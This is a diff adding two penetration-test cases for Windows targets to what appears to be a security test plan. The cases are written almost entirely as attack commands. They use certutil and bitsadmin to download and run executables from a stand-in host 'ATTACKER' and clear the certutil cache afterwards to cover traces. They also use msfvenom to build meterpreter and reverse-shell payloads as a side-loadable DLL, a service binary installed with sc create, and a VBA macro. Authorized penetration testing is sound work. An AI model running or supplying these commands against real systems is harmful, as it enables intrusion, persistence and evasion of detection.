@@ -211,3 +211,29 @@ Reference Payload: Corresponding section in payloads.md
 - **Remediation**: Deploy behavioral and heuristic detection alongside signature-based AV; enable AMSI for script content scanning; use application allowlisting to restrict unauthorized executables
 - **Pass Criteria**: At least one obfuscated payload achieves detection rate below 15/70 in sandbox; all functional payloads successfully connect to listener; obfuscation does not corrupt payload functionality
 - **Reference**: payloads.md Section 3 Encoding and Evasion
+
+---
+
+### TC-PG-009 | LOLBAS Download Cradle Execution
+
+- **Severity**: HIGH
+- **Prerequisites**: Windows target under authorized scope; outbound HTTP permitted; LOLBAS binaries unblocked by policy
+- **Test Steps**:
+  1. Host the payload: `python3 -m http.server 80` on attacker box
+  2. Download cradle via certutil: `certutil -urlcache -f http://ATTACKER/payload.exe C:\\Windows\\Temp\\p.exe`
+  3. Alternative transfer: `bitsadmin /transfer j http://ATTACKER/p.exe C:\\Temp\\p.exe`
+  4. Execute and verify callback: `C:\\Windows\\Temp\\p.exe`
+  5. Clean traces: `certutil -urlcache -f http://ATTACKER/p.exe delete`
+- **Expected Results**: Payload lands and executes using signed native binaries only, with no custom downloader artifacts on disk
+
+### TC-PG-010 | msfvenom Advanced Format Generation (DLL / Service / Macro)
+
+- **Severity**: HIGH
+- **Prerequisites**: Kali with msfvenom; target context allows one of: DLL side-loadable directory, service binary path, or Office macro delivery (authorized)
+- **Test Steps**:
+  1. DLL format: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o shell.dll` and register via side-loadable app
+  2. Service format: `msfvenom -p windows/x64/shell_reverse_tcp ... -f exe-service -o svc.exe`; install via `sc create upd binPath= "C:\\Temp\\svc.exe"`
+  3. Macro format: `msfvenom -p windows/meterpreter/reverse_tcp ... -f vba` and embed in a document macro
+  4. Set up matching handlers (`use exploit/multi/handler`) and verify each callback
+- **Expected Results**: All three delivery formats produce working callbacks, demonstrating format-to-context matching for payload selection
+
